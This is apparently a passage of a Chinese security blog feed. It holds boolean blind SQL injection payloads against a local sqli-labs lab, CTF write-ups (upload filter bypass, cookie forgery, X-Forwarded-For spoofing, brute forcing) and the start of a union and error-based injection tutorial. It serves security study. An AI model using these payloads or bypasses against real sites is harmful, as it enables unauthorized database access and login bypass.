class="line">left(database(),1)&gt;&#39;s&#39;</span><br></pre></td></tr></table></figure><p>database()显示数据库名称,left(a,b)从左侧截取a的前b位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and left((select database()),1)&#x3D;&#39;s&#39;-- #</span><br></pre></td></tr></table></figure><p>我们使用第八关来测试</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200725143012557.png" alt="image-20200725143012557"></p><p>当前库名字的第一位如果为s则显示，不是s则不返回</p><p>我们导入burp进行爆破测试，爆破点还是测试数据s</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200725161625813.png" alt="image-20200725161625813"></p><p>然后直接进行爆破，查看返回长度，发现数值为s的时候，与其他的不相符合，然后再次进行爆破</p><p>修改代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and left((select database()),2)&#x3D;&#39;sa&#39;-- #</span><br></pre></td></tr></table></figure><p>将sa的a作为爆破点，直到爆出完整名称</p><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39;       </span><br></pre></td></tr></table></figure><p>正则表达式的用法，user()结果为root,regexp为匹配root的正则表达式</p><p>mysql正则表达式：<a href="https://www.runoob.com/mysql/mysql-regexp.html">https://www.runoob.com/mysql/mysql-regexp.html</a></p><p>^表示匹配输入字符串的开始位置，即从输入开始判断字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (select database()) regexp &#39;^se&#39;-- #</span><br></pre></td></tr></table></figure><p>意思是前两位是se开头(也可以s开头)，如果是则返回You are in….，不是则不返回</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730161027178.png" alt="image-20200730161027178"></p><p>在里面可直接增加字符</p><p>对数据表进行布尔盲注爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) regexp &#39;^se&#39;-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730161854574.png" alt="image-20200730161854574"></p><h3 id="like"><a href="#like" class="headerlink" title="like"></a>like</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure><p>与regexp类似，使用like进行匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) like &#39;e%&#39;-- #</span><br></pre></td></tr></table></figure><p>以e开头，如果是则返回You are in….，不是则不返回</p><h3 id="subst-函数和ascii-函数"><a href="#subst-函数和ascii-函数" class="headerlink" title="subst()函数和ascii()函数"></a>subst()函数和ascii()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&#x3D;98</span><br></pre></td></tr></table></figure><p>substr(a,b,c)从b位置开始,截取字符串a的c长度。ascii()将某个字符转换为ascii值，使用ascii值可以绕过一些不能使用单引号的场景</p><p>字符串截取后比较ascii</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&#x3D;115-- #</span><br></pre></td></tr></table></figure><p>s的ascii码是115，所以这里能够正常返回</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730172224632.png" alt="image-20200730172224632"></p><h3 id="ord-函数和mid-函数"><a href="#ord-函数和mid-函数" class="headerlink" title="ord()函数和mid()函数"></a>ord()函数和mid()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid((select user()),1,1))&#x3D;114</span><br></pre></td></tr></table></figure><p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符串转为ascii值，由于使用方式同subst()函数和ascii()函数，就不再演示了</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.合天网安第五题-Easy upload</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/5.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%BA%94%E9%A2%98-Easy%20upload%20/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/5.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%BA%94%E9%A2%98-Easy%20upload%20/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第五题-Easy upload </p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=464012dd-3bf3-41e2-b3f8-45733d60db44">https://www.hetianlab.com/expc.do?ce=464012dd-3bf3-41e2-b3f8-45733d60db44</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5005</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这道题是个最基础的文件上传，打开网页然后读源码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730141647728.png" alt="image-20200730141647728"></p><p>我们能够很直观的看到文件限制，并且他的文件限制是用js写的，那么我直接使用burp抓包，抓一个正常上传的包，那么他的js文件限制就不存在了</p><p>我们在远程电脑的图库里面找到了一张图，并进行了抓包，放到了重发器里面</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730141946951.png" alt="image-20200730141946951"></p><p>然后我们知道了他需要的是一个give_me_flag.php</p><p>然后直接修改上传名</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730142100007.png" alt="image-20200730142100007"></p><p>然后他又叫我们规定了内容，一样的，在内容里面添加上就好了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200730142216792.png" alt="image-20200730142216792"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4.合天网安第四题-Check your source code</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/4.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%9B%9B%E9%A2%98-Check%20your%20source%20code/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/4.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%9B%9B%E9%A2%98-Check%20your%20source%20code/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第四题-Check your source code</p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=dd7ea334-916b-4174-953a-36d65000abed">https://www.hetianlab.com/expc.do?ce=dd7ea334-916b-4174-953a-36d65000abed</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5004</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这道题强调细心细心细心</p><p>实验指导书的ip地址进入，发现是一个表单</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729164637646.png" alt="image-20200729164637646"></p><p>查看源代码发现了一个指示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729164701993.png" alt="image-20200729164701993"></p><p>进去之后就看到了这道题后端php代码，既然能阅读源码，我们就先阅读一下源代码，为了方便，我已经写上了注释，建议先自己看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//隐藏部分</span></span><br><span class="line">$flag = <span class="string">&quot;XXXXXXXXXXXXXXXX&quot;</span>;</span><br><span class="line">$secret = <span class="string">&quot;xx&quot;</span>;<span class="comment">//88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果接受值为空就直接退出</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&quot;username&quot;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&quot;password&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收传值</span></span><br><span class="line">$username = $_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">&quot;check&quot;</span>])) &#123;<span class="comment">//检查cookie的时候使用为check</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//username等于admin 而 password不等于admin</span></span><br><span class="line"><span class="comment">//urlcode解码：因为传输的时候会编码</span></span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode($password) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line"><span class="comment">//Cookie键名为check的值等于base64编码的$secret和url编码的$username与$password的结果拼接</span></span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">&quot;check&quot;</span>] === base64_encode($secret) . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Login successful.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. $flag);<span class="comment">//输出flag</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;??????????????cookie????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;????????????????????????????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">setcookie(<span class="string">&quot;ahash&quot;</span>, base64_encode($secret . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="comment">//生成键名为ahash的cookie 生成方式admin和admin先进行一次url编码，然后base64编码$secret与刚才url编码的结果，最后一个time为有效期7天</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后进行burp抓包</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729165157301.png" alt="image-20200729165157301"></p><p>我们这里可以看到cookie的值的结果，我们在源代码中已经知道了生成方式，进行逆推</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729165330728.png" alt="image-20200729165330728"></p><p>结果为88adminadmin，那么我们就知道了$secret的值为88</p><p>我们现在已经知道了cookie验证要求键名为check，check的组成是base64编码的$secret和url编码的$username与$password的结果拼接</p><p>然后我们也知道password的值不等于admin，所以我们暂且修改为asd</p><p>$secre等于88，base64编码结果为ODg=</p><p>账号为admin密码为asd，url编码为%61%64%6d%69%6e%61%73%64</p><p>然后在根据上面的代码组成cookie键check=ODg=%61%64%6d%69%6e%61%73%64</p><p>最后测试获得cookie</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729165923574.png" alt="image-20200729165923574"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.合天网安第三题-迷了路</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/3.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%89%E9%A2%98-%E8%BF%B7%E4%BA%86%E8%B7%AF/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/3.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%89%E9%A2%98-%E8%BF%B7%E4%BA%86%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第三题-迷了路</p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=1b397405-1d74-4411-9c8c-6012a0c10b53">https://www.hetianlab.com/expc.do?ce=1b397405-1d74-4411-9c8c-6012a0c10b53</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>题目简介：学会八国语言，我带上你，你带上钱，我们出国走一走</p><p>目标机：Centos7 IP地址：10.1.1.147:5003</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>然后还是第一件事情，去题目页面看看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200728160611294.png" alt="image-20200728160611294"></p><p>源码页面</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200728160701120.png" alt="image-20200728160701120"></p><p>抓包也没有什么线索</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200728161710813.png" alt="image-20200728161710813"></p><p>这道题比较烧脑，搜索了攻略才知道，题目简介告诉了我们，语言语言</p><p>然后再burp里面修改了语言</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200728161806709.png" alt="image-20200728161806709"></p><p>发现了flag的头，大概懂意思了，就跟着国旗顺序走一趟</p><blockquote><p>Accept-Language：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language</a></p><p>语言代码缩写表大全(并不完全准确)：<a href="https://blog.csdn.net/u014549283/article/details/81742104">https://blog.csdn.net/u014549283/article/details/81742104</a></p></blockquote><p>Accept-Language查询结果：</p><p>美国 en-us    英国 en-gb    法国 fr    德语 de 日语 jp    韩语 ko    西班牙 es    瑞典 sve</p><p>组合结果：flag{Thisis_hetianlab@}</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.合天网安第二题-就差一把钥匙</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/2.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%BA%8C%E9%A2%98-%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/2.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%BA%8C%E9%A2%98-%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第二题-就差一把钥匙</p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=966d6642-3bfe-45cb-939f-d32d40ef3321">https://www.hetianlab.com/expc.do?ce=966d6642-3bfe-45cb-939f-d32d40ef3321</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5002</p><p>攻击机：Kali     IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>实验指导书还是只给了网址，直接进去看看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200727180158955.png" alt="image-20200727180158955"></p><p>emmm….</p><p>burp也没啥发现，就打开了问答栏，被大佬提示了一个/robot.txt，就想到了robots.txt</p><blockquote><p>robots协议：<a href="https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fromtitle=robots.txt&amp;fromid=9518761&amp;fr=aladdin">https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fromtitle=robots.txt&amp;fromid=9518761&amp;fr=aladdin</a></p></blockquote><p>果真</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200727181159078.png" alt="image-20200727181159078"></p><p>/console/肯定有什么见不得人的秘密</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200727181235567.png" alt="image-20200727181235567"></p><p>但是直接搞不了，可能需要进行一下IP欺骗</p><blockquote><p>xff欺骗：<a href="https://blog.csdn.net/zz_Caleb/article/details/84147066">https://blog.csdn.net/zz_Caleb/article/details/84147066</a></p></blockquote><p>burp抓包然后丢到重放里面进行测试，测试目标电脑本地地址</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200727182641352.png" alt="image-20200727182641352"></p><p>成功爆出</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.合天网安第一题-套娃的磁带</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/1.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%80%E9%A2%98-%E5%A5%97%E5%A8%83%E7%9A%84%E7%A3%81%E5%B8%A6/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/1.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%80%E9%A2%98-%E5%A5%97%E5%A8%83%E7%9A%84%E7%A3%81%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安-第一周-神器的磁带</p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=9899c278-77eb-4ca9-8951-a05616d1c565">https://www.hetianlab.com/expc.do?ce=9899c278-77eb-4ca9-8951-a05616d1c565</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5001</p><p>攻击机：Kali     IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为Flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>既然实验指导书给了网址，进入试验机肯定首先，打开网址看看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726114517067.png" alt="image-20200726114517067"></p><p>查看源代码，在源代码中发现了flag.txt的踪迹</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726114629312.png" alt="image-20200726114629312"></p><p>肯定不可能这么简单，将信将疑的打开它</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726114710445.png" alt="image-20200726114710445"></p><p>果然，全都是乱码，没啥利用价值，随手进行了一下注入点的测试，也没发现什么，只好挂上代理，burp抓包看看了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726114939294.png" alt="image-20200726114939294"></p><p>别说，这个东西感觉挺像base64的，直接decode解码试试</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115021510.png" alt="image-20200726115021510"></p><p>结果丢入输入框看看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115120814.png" alt="image-20200726115120814"></p><p>有输出了，点ok弹出了一句话</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115150784.png" alt="image-20200726115150784"></p><p>磁带，英文tape，再次输入，就又有了下文</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115239720.png" alt="image-20200726115239720"></p><p>进去之后又是一个谜语</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115335805.png" alt="image-20200726115335805"></p><p>脑海里面全都是一只米老鼠，然后百度了才知道是宝塔镇河妖，回到刚才的页面输进去</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115439714.png" alt="image-20200726115439714"></p><p>又来一个套娃网址</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115503704.png" alt="image-20200726115503704"></p><p>进去</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115537229.png" alt="image-20200726115537229"></p><p>还是打开源码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115631371.png" alt="image-20200726115631371"></p><p>搞爆破嘛</p><p>设置爆破点</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115732017.png" alt="image-20200726115732017"></p><p>数值爆破10-99</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115754878.png" alt="image-20200726115754878"></p><p>输出结果，发现一个长度不一样的是66</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115832565.png" alt="image-20200726115832565"></p><p>最后在爆破网页输入66，得到flag</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200726115904722.png" alt="image-20200726115904722"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4.SQL注入语法类型</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/4.SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/4.SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>SQL注入的语法类型分为union联合查询注入和报错注入，在上一章手工注入中，我们大量使用union操作符，我们在这一节会对它进行一个简单的总结，然后对报错注入进行一个详细的讲解</p><a id="more"></a><hr><h1 id="union联合查询注入"><a href="#union联合查询注入" class="headerlink" title="union联合查询注入"></a>union联合查询注入</h1><h2 id="union操作符介绍"><a href="#union操作符介绍" class="headerlink" title="union操作符介绍"></a>union操作符介绍</h2><p>union操作符用于合并两个或多个select语句的结果集</p><p>注意，union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须相同</p><p>默认情况下，union操作符选取不同的值。如果允许重复值，请使用UNION ALL</p><h2 id="union注入应用场景"><a href="#union注入应用场景" class="headerlink" title="union注入应用场景"></a>union注入应用场景</h2><p>union注入是有一定的前提条件的</p><ul><li>只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果</li><li>注入点页面需要有回显</li></ul><p>注意点</p><ul><li>order by 语句需要放在最后一个select语句中</li><li>limit 语句也需要放在最后一个select语句中</li></ul><h2 id="union注入过程"><a href="#union注入过程" class="headerlink" title="union注入过程"></a>union注入过程</h2><p>union注入过程就是上一章的手工注入过程，这里只进行简单总结</p><ol><li>order by确定列数</li><li>观察页面返回，选取可以显示数据的位置，进行下一步注入</li><li>读库、表、字段、数据、及任意相关语句</li></ol><hr><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>构造payload让信息通过错误的提示回显出来</p><p>应用场景：</p><p>查询不回现内容，会打印错误信息、Update、insert等语句后页面也会打印错误信息</p><p>例如代码场景为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这里<code>$row</code>不为真，则会返回<code>mysql_error()</code>的报错信息，如果我们故意构造报错语句，让他返回错误信息的时候带上了我们想要的数据，就完成了一次报错注入</p><p>凡是可以让错误信息显示的函数(语句)，都能实现报错注入</p><h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p>前排参考文档：<a 